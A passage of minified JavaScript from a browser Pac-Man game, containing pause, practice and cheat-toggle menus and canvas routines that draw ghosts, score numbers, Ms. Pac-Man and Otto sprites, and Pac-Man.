        this.buttonCount++,
        (this.currentY += this.pad + this.h);
    },
    addIconButton: function (drawIcon, onclick) {
      var b = new Button(
        this.x + this.pad,
        this.currentY,
        this.w - 2 * this.pad,
        this.h,
        onclick
      );
      b.setIcon(drawIcon),
        this.buttons.push(b),
        this.buttonCount++,
        (this.currentY += this.pad + this.h);
    },
    addSpacer: function (count) {
      null == count && (count = 1),
        (this.currentY += count * (this.pad + this.h));
    },
    enable: function () {
      var i;
      for (i = 0; i < this.buttonCount; i++) this.buttons[i].enable();
      this.enabled = !0;
    },
    disable: function () {
      var i;
      for (i = 0; i < this.buttonCount; i++) this.buttons[i].disable();
      this.enabled = !1;
    },
    isEnabled: function () {
      return this.enabled;
    },
    draw: function (ctx) {
      var i;
      for (
        this.title &&
          ((ctx.font = "8px ArcadeR"),
          (ctx.textBaseline = "middle"),
          (ctx.textAlign = "center"),
          (ctx.fillStyle = "#FFF"),
          ctx.fillText(
            this.title,
            this.x + this.w / 2,
            this.y + this.pad + this.h / 2
          )),
          i = 0;
        i < this.buttonCount;
        i++
      )
        this.buttons[i].draw(ctx);
    },
    update: function () {
      var i;
      for (i = 0; i < this.buttonCount; i++) this.buttons[i].update();
    },
  };
  var coords,
    addHead,
    addFeet1,
    addFeet2,
    prevFrame,
    sx1,
    sy1,
    sx2,
    sy2,
    inGameMenu = (function () {
      var getMainMenu = function () {
          return practiceMode ? practiceMenu : menu;
        },
        showMainMenu = function () {
          getMainMenu().enable();
        },
        hideMainMenu = function () {
          getMainMenu().disable();
        },
        btn = new Button(89, 290, 48, 24, function () {
          showMainMenu(), vcr.onHudDisable();
        });
      btn.setText("MENU"), btn.setFont("8px ArcadeR", "#FFF");
      var confirmMenu = new Menu(
        "QUESTION?",
        16,
        40,
        194,
        24,
        8,
        "8px ArcadeR",
        "#EEE"
      );
      confirmMenu.addTextButton("YES", function () {
        confirmMenu.disable(), confirmMenu.onConfirm();
      }),
        confirmMenu.addTextButton("NO", function () {
          confirmMenu.disable(), showMainMenu();
        }),
        confirmMenu.addTextButton("CANCEL", function () {
          confirmMenu.disable(), showMainMenu();
        }),
        (confirmMenu.backButton =
          confirmMenu.buttons[confirmMenu.buttonCount - 1]);
      var showConfirm = function (title, onConfirm) {
          hideMainMenu(),
            (confirmMenu.title = title),
            (confirmMenu.onConfirm = onConfirm),
            confirmMenu.enable();
        },
        menu = new Menu("PAUSED", 16, 40, 194, 24, 8, "8px ArcadeR", "#EEE");
      menu.addTextButton("RESUME", function () {
        menu.disable();
      }),
        menu.addTextButton("QUIT", function () {
          showConfirm("QUIT GAME?", function () {
            switchState(homeState, 60);
          });
        }),
        (menu.backButton = menu.buttons[0]);
      var practiceMenu = new Menu(
        "PAUSED",
        16,
        40,
        194,
        24,
        8,
        "8px ArcadeR",
        "#EEE"
      );
      practiceMenu.addTextButton("RESUME", function () {
        hideMainMenu(), vcr.onHudEnable();
      }),
        practiceMenu.addTextButton("RESTART LEVEL", function () {
          showConfirm("RESTART LEVEL?", function () {
            level--, switchState(readyNewState, 60);
          });
        }),
        practiceMenu.addTextButton("SKIP LEVEL", function () {
          showConfirm("SKIP LEVEL?", function () {
            switchState(readyNewState, 60);
          });
        }),
        practiceMenu.addTextButton("CHEATS", function () {
          practiceMenu.disable(), cheatsMenu.enable();
        }),
        practiceMenu.addTextButton("QUIT", function () {
          showConfirm("QUIT GAME?", function () {
            switchState(homeState, 60), clearCheats(), vcr.reset();
          });
        }),
        (practiceMenu.backButton = practiceMenu.buttons[0]);
      var cheatsMenu = new Menu(
        "CHEATS",
        16,
        40,
        194,
        24,
        8,
        "8px ArcadeR",
        "#EEE"
      );
      cheatsMenu.addToggleTextButton(
        "INVINCIBLE",
        function () {
          return pacman.invincible;
        },
        function (on) {
          pacman.invincible = on;
        }
      ),
        cheatsMenu.addToggleTextButton(
          "TURBO",
          function () {
            return turboMode;
          },
          function (on) {
            turboMode = on;
          }
        ),
        cheatsMenu.addToggleTextButton(
          "SHOW TARGETS",
          function () {
            return blinky.isDrawTarget;
          },
          function (on) {
            for (var i = 0; i < 4; i++) ghosts[i].isDrawTarget = on;
          }
        ),
        cheatsMenu.addToggleTextButton(
          "SHOW PATHS",
          function () {
            return blinky.isDrawPath;
          },
          function (on) {
            for (var i = 0; i < 4; i++) ghosts[i].isDrawPath = on;
          }
        ),
        cheatsMenu.addSpacer(1),
        cheatsMenu.addTextButton("BACK", function () {
          cheatsMenu.disable(), practiceMenu.enable();
        }),
        (cheatsMenu.backButton =
          cheatsMenu.buttons[cheatsMenu.buttons.length - 1]);
      var menus = [menu, practiceMenu, confirmMenu, cheatsMenu],
        getVisibleMenu = function () {
          var i,
            m,
            len = menus.length;
          for (i = 0; i < len; i++) if ((m = menus[i]).isEnabled()) return m;
        };
      return {
        onHudEnable: function () {
          btn.enable();
        },
        onHudDisable: function () {
          btn.disable();
        },
        update: function () {
          btn.isEnabled && btn.update();
        },
        draw: function (ctx) {
          var m = getVisibleMenu();
          m
            ? ((ctx.fillStyle = "rgba(0,0,0,0.8)"),
              ctx.fillRect(-2, -2, 227, 291),
              m.draw(ctx))
            : btn.draw(ctx);
        },
        isOpen: function () {
          return null != getVisibleMenu();
        },
        getMenu: function () {
          return getVisibleMenu();
        },
        getMenuButton: function () {
          return btn;
        },
      };
    })(),
    drawGhostSprite =
      ((addHead = function (ctx) {
        ctx.save(),
          ctx.translate(0.5, 0),
          ctx.moveTo(0, 6),
          ctx.quadraticCurveTo(1.5, 0, 6.5, 0),
          ctx.quadraticCurveTo(11.5, 0, 13, 6),
          ctx.restore();
      }),
      (coords = [
        13, 13, 11, 11, 9, 13, 8, 13, 8, 11, 5, 11, 5, 13, 4, 13, 2, 11, 0, 13,
      ]),
      (addFeet1 = function (ctx) {
        var i;
        for (
          ctx.save(), ctx.translate(0.5, 0.5), i = 0;
          i < coords.length;
          i += 2
        )
          ctx.lineTo(coords[i], coords[i + 1]);
        ctx.restore();
      }),
      (addFeet2 = (function () {
        var coords = [
          13, 12, 12, 13, 11, 13, 9, 11, 7, 13, 6, 13, 4, 11, 2, 13, 1, 13, 0,
          12,
        ];
        return function (ctx) {
          var i;
          for (
            ctx.save(), ctx.translate(0.5, 0.5), i = 0;
            i < coords.length;
            i += 2
          )
            ctx.lineTo(coords[i], coords[i + 1]);
          ctx.restore();
        };
      })()),
      function (ctx, x, y, frame, dirEnum, scared, flash, eyes_only, color) {
        ctx.save(),
          ctx.translate(x - 7, y - 7),
          scared && (color = flash ? "#FFF" : "#2121ff"),
          eyes_only ||
            (ctx.beginPath(),
            addHead(ctx),
            0 == frame ? addFeet1(ctx) : addFeet2(ctx),
            ctx.closePath(),
            (ctx.lineJoin = "round"),
            (ctx.lineCap = "round"),
            (ctx.lineWidth = 0.5),
            (ctx.strokeStyle = color),
            ctx.stroke(),
            (ctx.lineWidth = 1),
            (ctx.fillStyle = color),
            ctx.fill()),
          scared
            ? (function (ctx, flash) {
                (ctx.strokeStyle = ctx.fillStyle = flash ? "#F00" : "#FF0"),
                  ctx.fillRect(4, 5, 2, 2),
                  ctx.fillRect(8, 5, 2, 2);
                var coords = [
                  1, 10, 2, 9, 3, 9, 4, 10, 5, 10, 6, 9, 7, 9, 8, 10, 9, 10, 10,
                  9, 11, 9, 12, 10,
                ];
                for (
                  ctx.translate(0.5, 0.5),
                    ctx.beginPath(),
                    ctx.moveTo(coords[0], coords[1]),
                    i = 2;
                  i < coords.length;
                  i += 2
                )
                  ctx.lineTo(coords[i], coords[i + 1]);
                (ctx.lineWidth = 1), ctx.stroke(), ctx.translate(-0.5, -0.5);
              })(ctx, flash)
            : (function (ctx, dirEnum) {
                var i;
                ctx.save(), ctx.translate(2, 3);
                var coords = [0, 1, 1, 0, 2, 0, 3, 1, 3, 3, 2, 4, 1, 4, 0, 3],
                  drawEyeball = function () {
                    for (
                      ctx.translate(0.5, 0.5),
                        ctx.beginPath(),
                        ctx.moveTo(coords[0], coords[1]),
                        i = 2;
                      i < coords.length;
                      i += 2
                    )
                      ctx.lineTo(coords[i], coords[i + 1]);
                    ctx.closePath(),
                      ctx.fill(),
                      (ctx.lineJoin = "round"),
                      ctx.stroke(),
                      ctx.translate(-0.5, -0.5);
                  };
                1 == dirEnum
                  ? ctx.translate(-1, 0)
                  : 3 == dirEnum
                  ? ctx.translate(1, 0)
                  : 0 == dirEnum
                  ? ctx.translate(0, -1)
                  : 2 == dirEnum && ctx.translate(0, 1),
                  (ctx.fillStyle = "#FFF"),
                  (ctx.strokeStyle = "#FFF"),
                  (ctx.lineWidth = 1),
                  (ctx.lineJoin = "round"),
                  drawEyeball(),
                  ctx.translate(6, 0),
                  drawEyeball(),
                  1 == dirEnum
                    ? ctx.translate(0, 2)
                    : 3 == dirEnum
                    ? ctx.translate(2, 2)
                    : 0 == dirEnum
                    ? ctx.translate(1, 0)
                    : 2 == dirEnum && ctx.translate(1, 3),
                  (ctx.fillStyle = "#00F"),
                  ctx.fillRect(0, 0, 2, 2),
                  ctx.translate(-6, 0),
                  ctx.fillRect(0, 0, 2, 2),
                  ctx.restore();
              })(ctx, dirEnum),
          ctx.restore();
      }),
    drawPacPoints = (function () {
      var ctx,
        color,
        plotOutline = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          ctx.closePath(),
            (ctx.lineWidth = 1),
            (ctx.lineCap = ctx.lineJoin = "round"),
            (ctx.strokeStyle = color),
            ctx.stroke();
        },
        plotLine = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          (ctx.lineWidth = 1),
            (ctx.lineCap = ctx.lineJoin = "round"),
            (ctx.strokeStyle = color),
            ctx.stroke();
        },
        draw0 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotOutline(
              [1, 0, 2, 0, 3, 1, 3, 5, 2, 6, 1, 6, 0, 5, 0, 1],
              color
            ),
            ctx.restore();
        },
        draw1 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine([0, 1, 1, 0, 1, 6, 0, 6, 2, 6], color),
            ctx.restore();
        },
        draw2 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine([0, 2, 0, 1, 1, 0, 3, 0, 4, 1, 4, 2, 0, 6, 4, 6], color),
            ctx.restore();
        },
        draw3 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine([0, 0, 4, 0, 2, 2, 4, 4, 4, 5, 3, 6, 1, 6, 0, 5], color),
            ctx.restore();
        },
        draw5 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine(
              [4, 0, 0, 0, 0, 2, 3, 2, 4, 3, 4, 5, 3, 6, 1, 6, 0, 5],
              color
            ),
            ctx.restore();
        },
        draw100 = function () {
          draw1(-5, -3), draw0(-1, -3), draw0(4, -3);
        },
        draw200 = function () {
          draw2(-7, -3), draw0(-1, -3), draw0(4, -3);
        },
        draw300 = function () {
          draw3(-7, -3), draw0(-1, -3), draw0(4, -3);
        },
        draw400 = function () {
          !(function (x, y) {
            ctx.save(),
              ctx.translate(x, y),
              plotLine([3, 6, 3, 0, 0, 3, 0, 4, 4, 4], color),
              ctx.restore();
          })(-7, -3),
            draw0(-1, -3),
            draw0(4, -3);
        },
        draw500 = function () {
          draw5(-7, -3), draw0(-1, -3), draw0(4, -3);
        },
        draw700 = function () {
          !(function (x, y) {
            ctx.save(),
              ctx.translate(x, y),
              plotLine([0, 1, 0, 0, 4, 0, 4, 1, 2, 4, 2, 6], color),
              ctx.restore();
          })(-7, -3),
            draw0(-1, -3),
            draw0(4, -3);
        },
        draw800 = function () {
          !(function (x, y) {
            ctx.save(),
              ctx.translate(x, y),
              plotOutline(
                [
                  1, 0, 3, 0, 4, 1, 4, 2, 3, 3, 1, 3, 0, 4, 0, 5, 1, 6, 3, 6, 4,
                  5, 4, 4, 3, 3, 1, 3, 0, 2, 0, 1,
                ],
                color
              ),
              ctx.restore();
          })(-7, -3),
            draw0(-1, -3),
            draw0(4, -3);
        },
        draw1000 = function () {
          draw1(-8, -3), draw0(-4, -3), draw0(1, -3), draw0(6, -3);
        },
        draw1600 = function () {
          !(function (x, y) {
            plotLine([x, y, x, y + 6], color);
          })(-7, -3),
            (function (x, y) {
              ctx.save(),
                ctx.translate(x, y),
                plotLine(
                  [3, 0, 1, 0, 0, 1, 0, 5, 1, 6, 2, 6, 3, 5, 3, 3, 0, 3],
                  color
                ),
                ctx.restore();
            })(-5, -3),
            draw0(0, -3),
            draw0(5, -3);
        },
        draw2000 = function () {
          draw2(-10, -3), draw0(-4, -3), draw0(1, -3), draw0(6, -3);
        },
        draw3000 = function () {
          draw3(-10, -3), draw0(-4, -3), draw0(1, -3), draw0(6, -3);
        },
        draw5000 = function () {
          draw5(-10, -3), draw0(-4, -3), draw0(1, -3), draw0(6, -3);
        };
      return function (_ctx, x, y, points, _color) {
        (color = _color),
          (ctx = _ctx).save(),
          ctx.translate(x + 0.5, y + 0.5),
          ctx.translate(0, -1);
        var f = {
          100: draw100,
          200: draw200,
          300: draw300,
          400: draw400,
          500: draw500,
          700: draw700,
          800: draw800,
          1e3: draw1000,
          1600: draw1600,
          2e3: draw2000,
          3e3: draw3000,
          5e3: draw5000,
        }[points];
        f && f(), ctx.restore();
      };
    })(),
    drawMsPacPoints = (function () {
      var ctx,
        plotLine = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          (ctx.lineWidth = 1),
            (ctx.lineCap = ctx.lineJoin = "round"),
            (ctx.strokeStyle = color),
            ctx.stroke();
        },
        draw0 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            (function (points, color) {
              var i,
                len = points.length;
              for (
                ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
                i < len;
                i += 2
              )
                ctx.lineTo(points[i], points[i + 1]);
              ctx.closePath(),
                (ctx.lineWidth = 1),
                (ctx.lineCap = ctx.lineJoin = "round"),
                (ctx.strokeStyle = color),
                ctx.stroke();
            })([0, 0, 2, 0, 2, 4, 0, 4], "#fff"),
            ctx.restore();
        },
        draw1 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine([1, 0, 1, 4], "#fff"),
            ctx.restore();
        },
        draw2 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine([0, 0, 2, 0, 2, 2, 0, 2, 0, 4, 2, 4], "#fff"),
            ctx.restore();
        },
        draw5 = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotLine([2, 0, 0, 0, 0, 2, 2, 2, 2, 4, 0, 4], "#fff"),
            ctx.restore();
        },
        draw100 = function () {
          draw1(-5, -5), draw0(-1, -2), draw0(3, 1);
        },
        draw200 = function () {
          draw2(-5, -5), draw0(-1, -2), draw0(3, 1);
        },
        draw500 = function () {
          draw5(-5, -5), draw0(-1, -2), draw0(3, 1);
        },
        draw700 = function () {
          !(function (x, y) {
            ctx.save(),
              ctx.translate(x, y),
              plotLine([0, 0, 2, 0, 2, 4], "#fff"),
              ctx.restore();
          })(-5, -5),
            draw0(-1, -2),
            draw0(3, 1);
        },
        draw1000 = function () {
          draw1(-7, -7), draw0(-3, -4), draw0(1, -1), draw0(5, 2);
        },
        draw2000 = function () {
          draw2(-7, -7), draw0(-3, -4), draw0(1, -1), draw0(5, 2);
        },
        draw5000 = function () {
          draw5(-7, -7), draw0(-3, -4), draw0(1, -1), draw0(5, 2);
        };
      return function (_ctx, x, y, points) {
        (ctx = _ctx).save(), ctx.translate(x + 0.5, y + 0.5);
        var f = {
          100: draw100,
          200: draw200,
          500: draw500,
          700: draw700,
          1e3: draw1000,
          2e3: draw2000,
          5e3: draw5000,
        }[points];
        f && f(), ctx.restore();
      };
    })(),
    drawMonsterSprite = (function () {
      var ctx,
        color,
        borderColor,
        faceColor,
        plotLine = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          (ctx.lineWidth = 1),
            (ctx.lineCap = ctx.lineJoin = "round"),
            (ctx.strokeStyle = color),
            ctx.stroke();
        },
        plotSolid = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          ctx.closePath(),
            (ctx.lineWidth = 1),
            (ctx.lineJoin = "round"),
            (ctx.fillStyle = ctx.strokeStyle = color),
            ctx.fill(),
            ctx.stroke();
        },
        drawEye = function (dirEnum, x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotSolid([0, 1, 1, 0, 2, 0, 3, 1, 3, 3, 2, 4, 1, 4, 0, 3], "#FFF"),
            1 == dirEnum
              ? ctx.translate(0, 2)
              : 3 == dirEnum
              ? ctx.translate(2, 2)
              : 0 == dirEnum
              ? ctx.translate(1, 0)
              : 2 == dirEnum && ctx.translate(1, 3),
            plotSolid([0, 0, 1, 0, 1, 1, 0, 1], "#00F"),
            ctx.restore();
        },
        drawRightBody = function () {
          plotSolid(
            [
              -7, -3, -3, -7, -1, -7, -2, -6, 0, -4, 3, -7, 5, -7, 4, -7, 3, -6,
              6, -3, 6, 1, 5, 3, 2, 6, -4, 6, -5, 5, -7, 1,
            ],
            color
          );
        },
        drawRightShoe = function (x, y) {
          ctx.save(),
            ctx.translate(x, y),
            plotSolid([0, 0, 3, -3, 4, -3, 5, -2, 5, -1, 4, 0], "#00F"),
            ctx.restore();
        },
        drawRight0 = function () {
          plotLine([-1, -7, 0, -6], "#FFF"),
            plotLine([5, -7, 6, -6], "#FFF"),
            drawRightBody(),
            drawRightShoe(1, 6),
            plotLine([-4, 6, -1, 6], "#00F"),
            drawEye(3, -4, -4),
            drawEye(3, 2, -4);
        },
        drawRight1 = function () {
          plotLine([-1, -7, 0, -7], "#FFF"),
            plotLine([5, -7, 6, -7], "#FFF"),
            drawRightBody(),
            drawRightShoe(-4, 6),
            plotLine([2, 6, 5, 6], "#00F"),
            drawEye(3, -4, -4),
            drawEye(3, 2, -4);
        },
        drawLeft0 = function () {
          ctx.scale(-1, 1), ctx.translate(1, 0), drawRight0();
        },
        drawLeft1 = function () {
          ctx.scale(-1, 1), ctx.translate(1, 0), drawRight1();
        },
        drawUpDownBody0 = function () {
          plotLine([-6, -7, -7, -6], "#FFF"),
            plotLine([5, -7, 6, -6], "#FFF"),
            plotSolid(
              [
                -7, -3, -4, -6, -5, -7, -6, -7, -4, -7, -3, -6, -2, -6, -1, -5,
                0, -5, 1, -6, 2, -6, 3, -7, 5, -7, 4, -7, 3, -6, 6, -3, 6, 1, 5,
                3, 4, 5, 3, 6, -4, 6, -5, 5, -6, 3, -7, 1,
              ],
              color
            );
        },
        drawUpDownBody1 = function () {
          plotLine([-6, -6, -7, -5], "#FFF"),
            plotLine([5, -6, 6, -5], "#FFF"),
            plotSolid(
              [
                -7, -3, -4, -6, -5, -7, -6, -6, -5, -7, -4, -7, -3, -6, -2, -6,
                -1, -5, 0, -5, 1, -6, 2, -6, 3, -7, 4, -7, 5, -6, 4, -7, 3, -6,
                6, -3, 6, 1, 5, 3, 4, 5, 3, 6, -4, 6, -5, 5, -6, 3, -7, 1,
              ],
              color
            );
        },
        drawUp0 = function () {
          drawUpDownBody0(),
            drawEye(0, -5, -5),
            drawEye(0, 1, -5),
            plotSolid([-4, 6, -3, 5, -2, 5, -1, 6], "#00F");
        },
        drawUp1 = function () {
          drawUpDownBody1(),
            drawEye(0, -5, -5),
            drawEye(0, 1, -5),
            plotSolid([0, 6, 1, 5, 2, 5, 3, 6], "#00F");
        },
        drawDown0 = function () {
          drawUpDownBody0(),
            drawEye(2, -5, -4),
            drawEye(2, 1, -4),
            plotSolid([0, 6, 1, 4, 2, 3, 3, 3, 4, 4, 4, 5, 3, 6], "#00F"),
            plotLine([-4, 6, -2, 6], "#00F");
        },
        drawDown1 = function () {
          drawUpDownBody1(),
            drawEye(2, -5, -4),
            drawEye(2, 1, -4),
            plotSolid(
              [-1, 6, -2, 4, -3, 3, -4, 3, -5, 4, -5, 5, -4, 6],
              "#00F"
            ),
            plotLine([1, 6, 3, 6], "#00F");
        },
        drawScaredBody = function () {
          !(function (points, color) {
            var i,
              len = points.length;
            for (
              ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
              i < len;
              i += 2
            )
              ctx.lineTo(points[i], points[i + 1]);
            ctx.closePath(),
              (ctx.lineWidth = 1),
              (ctx.lineCap = ctx.lineJoin = "round"),
              (ctx.strokeStyle = color),
              ctx.stroke();
          })(
            [
              -6, -2, -2, -5, -3, -6, -5, -6, -3, -6, -1, -4, 1, -4, 3, -6, 5,
              -6, 3, -6, 2, -5, 6, -2, 6, 4, 5, 6, 4, 7, -4, 7, -5, 6, -6, 4,
            ],
            borderColor
          ),
            plotLine([-2, 4, -1, 3, 1, 3, 2, 4], faceColor);
        },
        drawScared0 = function (flash) {
          plotLine([-2, -2, -2, 0], faceColor),
            plotLine([-3, -1, -1, -1], faceColor),
            plotLine([2, -2, 2, 0], faceColor),
            plotLine([3, -1, 1, -1], faceColor),
            plotLine([-5, -6, -6, -7], "#FFF"),
            plotLine([5, -6, 6, -7], "#FFF"),
            drawScaredBody();
        },
        drawScared1 = function (flash) {
          plotLine([-3, -2, -1, 0], faceColor),
            plotLine([-3, 0, -1, -2], faceColor),
            plotLine([1, -2, 3, 0], faceColor),
            plotLine([1, 0, 3, -2], faceColor),
            plotLine([-5, -6, -6, -5], "#FFF"),
            plotLine([5, -6, 6, -5], "#FFF"),
            drawScaredBody();
        };
      return function (
        _ctx,
        x,
        y,
        frame,
        dirEnum,
        scared,
        flash,
        eyes_only,
        _color
      ) {
        eyes_only ||
          ((color = _color),
          (ctx = _ctx).save(),
          ctx.translate(x + 0.5, y + 0.5),
          scared
            ? (ctx.translate(0, -1),
              (borderColor = flash ? "#FFF" : "#00F"),
              (faceColor = flash ? "#F00" : "#FF0"),
              [drawScared0, drawScared1][frame]())
            : 3 == dirEnum
            ? [drawRight0, drawRight1][frame]()
            : 1 == dirEnum
            ? [drawLeft0, drawLeft1][frame]()
            : 2 == dirEnum
            ? [drawDown0, drawDown1][frame]()
            : 0 == dirEnum && [drawUp0, drawUp1][frame](),
          ctx.restore());
      };
    })(),
    drawColoredOttoSprite = function (color, eyeColor) {
      var ctx,
        plotLine = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          (ctx.lineWidth = 1),
            (ctx.lineCap = ctx.lineJoin = "round"),
            (ctx.strokeStyle = color),
            ctx.stroke();
        },
        plotSolid = function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          ctx.closePath(),
            (ctx.lineWidth = 1),
            (ctx.lineJoin = "round"),
            (ctx.fillStyle = ctx.strokeStyle = color),
            ctx.fill(),
            ctx.stroke();
        },
        drawRightEye = function () {
          plotSolid([-4, -5, -3, -6, -2, -6, -2, -5, -3, -4, -4, -4], eyeColor);
        },
        drawRight0 = function () {
          plotSolid(
            [
              -5, -4, -3, -6, 2, -6, 3, -5, -1, -3, 3, -1, 1, 1, 1, 3, 3, 6, 5,
              4, 6, 4, 6, 5, 4, 7, 2, 7, -1, 1, -4, 4, -3, 6, -3, 7, -4, 7, -6,
              5, -6, 4, -3, 1, -5, -1,
            ],
            color
          ),
            drawRightEye();
        },
        drawRight1 = function () {
          plotSolid(
            [
              -5, -4, -3, -6, 1, -6, 3, -4, 3, -1, 1, 1, 1, 6, 4, 6, 4, 7, 0, 7,
              0, 1, -2, 1, -4, 3, -4, 4, -3, 5, -3, 6, -4, 6, -5, 4, -5, 3, -3,
              1, -5, -1,
            ],
            color
          ),
            drawRightEye();
        },
        drawRight2 = function () {
          plotSolid(
            [
              -5, -4, -3, -6, 2, -6, 3, -5, -1, -3, 3, -1, 1, 1, 1, 3, 4, 3, 4,
              4, 0, 4, 0, 1, -2, 1, -2, 6, 1, 6, 1, 7, -3, 7, -3, 1, -5, -1,
            ],
            color
          ),
            drawRightEye();
        },
        drawRight3 = function () {
          plotSolid(
            [
              -5, -4, -3, -6, 2, -6, -2, -3, 2, 0, 1, 1, 3, 5, 5, 3, 6, 3, 6, 4,
              4, 6, 2, 6, -1, 1, -3, 1, -3, 6, 0, 6, 0, 7, -4, 7, -4, 2, -3, 1,
              -5, -1,
            ],
            color
          ),
            drawRightEye();
        },
        drawUpDownEyes = function () {
          plotSolid([-5, -5, -4, -6, -3, -6, -3, -5, -4, -4, -5, -4], eyeColor),
            plotSolid([3, -6, 4, -6, 5, -5, 5, -4, 4, -4, 3, -5], eyeColor);
        },
        drawUpDownHead = function () {
          plotSolid(
            [-4, -4, -2, -6, 2, -6, 4, -4, 4, -1, 2, 1, -2, 1, -4, -1],
            color
          );
        },
        drawUpDownLeg0 = function (y, xs) {
          ctx.save(),
            ctx.translate(0, y),
            ctx.scale(xs, 1),
            plotSolid([1, 0, 2, 0, 2, 6, 4, 6, 4, 7, 1, 7], color),
            ctx.restore();
        },
        drawUpDownLeg1 = function (y, xs) {
          ctx.save(),
            ctx.translate(0, y),
            ctx.scale(xs, 1),
            plotSolid(
              [1, 0, 2, 0, 2, 4, 3, 5, 4, 4, 5, 4, 5, 5, 3, 7, 2, 7, 1, 6],
              color
            ),
            ctx.restore();
        },
        drawUpDownLegs0 = function () {
          drawUpDownLeg0(0, -1), drawUpDownLeg1(-2, 1);
        },
        drawUpDownLegs1 = function () {
          drawUpDownLeg0(-2, -1), drawUpDownLeg1(-2, 1);
        },
        drawUpDownLegs2 = function () {
          drawUpDownLeg1(-2, -1), drawUpDownLeg0(0, 1);
        },
        drawUpDownLegs3 = function () {
          drawUpDownLeg1(0, -1), drawUpDownLeg0(0, 1);
        },
        drawDown0 = function () {
          drawUpDownHead(),
            drawUpDownEyes(),
            drawUpDownLegs0(),
            plotLine([-2, -3, 2, -3], "#000");
        },
        drawDown1 = function () {
          drawUpDownHead(), drawUpDownEyes(), drawUpDownLegs1();
        },
        drawDown2 = function () {
          drawUpDownHead(),
            drawUpDownEyes(),
            drawUpDownLegs2(),
            plotLine([-2, -3, 2, -3], "#000");
        },
        drawDown3 = function () {
          drawUpDownHead(),
            drawUpDownEyes(),
            drawUpDownLegs3(),
            plotSolid([-2, -3, 0, -5, 2, -3, 0, -1], "#000");
        },
        drawUp0 = function () {
          drawUpDownEyes(), drawUpDownHead(), drawUpDownLegs0();
        },
        drawUp1 = function () {
          drawUpDownEyes(), drawUpDownHead(), drawUpDownLegs1();
        },
        drawUp2 = function () {
          drawUpDownEyes(), drawUpDownHead(), drawUpDownLegs2();
        },
        drawUp3 = function () {
          drawUpDownEyes(), drawUpDownHead(), drawUpDownLegs3();
        };
      return function (_ctx, x, y, dirEnum, frame, rotate) {
        (ctx = _ctx).save(),
          ctx.translate(x + 0.5, y + 0.5),
          rotate && ctx.rotate(rotate),
          3 == dirEnum
            ? (ctx.translate(0, -1),
              [drawRight0, drawRight1, drawRight2, drawRight3][frame]())
            : 1 == dirEnum
            ? (ctx.translate(0, -1),
              ctx.scale(-1, 1),
              [drawRight0, drawRight1, drawRight2, drawRight3][frame]())
            : 2 == dirEnum
            ? (ctx.translate(0, -1),
              [drawDown0, drawDown1, drawDown2, drawDown3][frame]())
            : 0 == dirEnum &&
              (ctx.translate(0, -1),
              [drawUp0, drawUp1, drawUp2, drawUp3][frame]()),
          ctx.restore();
      };
    },
    drawOttoSprite = drawColoredOttoSprite("#FF0", "#00F"),
    drawMsOttoSprite = drawColoredOttoSprite("#F00", "#FFF"),
    drawDeadOttoSprite = function (ctx, x, y) {
      ctx.save(),
        ctx.translate(x + 2, y),
        (function (points, color) {
          var i,
            len = points.length;
          for (
            ctx.beginPath(), ctx.moveTo(points[0], points[1]), i = 2;
            i < len;
            i += 2
          )
            ctx.lineTo(points[i], points[i + 1]);
          ctx.closePath(),
            (ctx.lineWidth = 1),
            (ctx.lineCap = ctx.lineJoin = "round"),
            (ctx.strokeStyle = color),
            ctx.stroke();
        })(
          [3, -5, -1, -5, -2, -6, -2, -7, -1, -8, 3, -8, 4, -7, 4, -6],
          "#F00"
        ),
        ctx.restore(),
        drawOttoSprite(ctx, x, y, 1, 2, Math.PI / 2);
    },
    drawPacmanSprite = function (
      ctx,
      x,
      y,
      dirEnum,
      angle,
      mouthShift,
      scale,
      centerShift,
      alpha,
      color,
      rot_angle
    ) {
      null == mouthShift && (mouthShift = 0),
        null == centerShift && (centerShift = 0),
        null == scale && (scale = 1),
        null == alpha && (alpha = 1),
        null == color && (color = "rgba(255,255,0," + alpha + ")"),
        ctx.save(),
        ctx.translate(x, y),
        ctx.scale(scale, scale),
        rot_angle && ctx.rotate(rot_angle);
      var d90 = Math.PI / 2;
      0 == dirEnum
        ? ctx.rotate(3 * d90)
        : 3 == dirEnum
        ? ctx.rotate(0)
        : 2 == dirEnum
        ? ctx.rotate(d90)
        : 1 == dirEnum && ctx.rotate(2 * d90),
        ctx.beginPath(),
        ctx.moveTo(-3 + mouthShift, 0),
        ctx.arc(centerShift, 0, 6.5, angle, 2 * Math.PI - angle),
        ctx.closePath(),
        (ctx.fillStyle = color),
        ctx.fill(),
